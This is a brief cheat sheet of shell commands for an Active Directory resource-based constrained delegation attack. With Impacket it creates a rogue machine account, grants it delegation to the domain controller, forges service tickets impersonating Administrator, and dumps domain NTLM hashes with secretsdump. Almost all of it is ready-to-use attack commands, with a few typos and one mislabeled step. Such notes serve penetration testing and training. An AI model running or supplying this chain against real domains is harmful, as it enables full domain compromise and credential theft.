* can exploit via RBCD

```bash
addcomputer.py -computer-name 'BADCOMPUTER$' -computer-pass 'PASSWORD!' -dc-host [dc-host] -domain-netbios [domain] [domain]/[user]:'password'
```

* grant system rights to impersonate administrator user
```bash
impacket-rbcd -delegate-from 'BADCOMPUTER$' -delegate-to 'DC$' -dc-ip [dc-ip] -action 'write' '[domain] [domain]/[user]:password''
```

# obtain service ticket TGS
```bash
getST.py -spn 'cifs/DC.[fqdn]' -impersonate Administrator -dc-ip [dc-ip] '[domain]/BADCOMPUTER$:PASSWORD!'
```

# match time of your attack machine to dc
```bash
udo rdate -n [domain]
sudo ntpdate -u [domain]
```

# Get admin hash
```bash
getST.py -spn 'LDAP/DC.[fqdn]' -impersonate Administrator -dc-ip [dc-ip] '[domain]/BADCOMPUTER$:PASSWORD!'
```

# Export ticket
```bash
export KRB5CCNAME=/home/kali/Downloads/bingbing/payloads/Administrator.ccache
```

# Dump the hash
```bash
secretsdump.py '[domain]/Administrator@DC.[fqdn]' -k -no-pass -dc-ip [dc-ip] -target-ip [dc-ip] -just-dc-ntlm
```
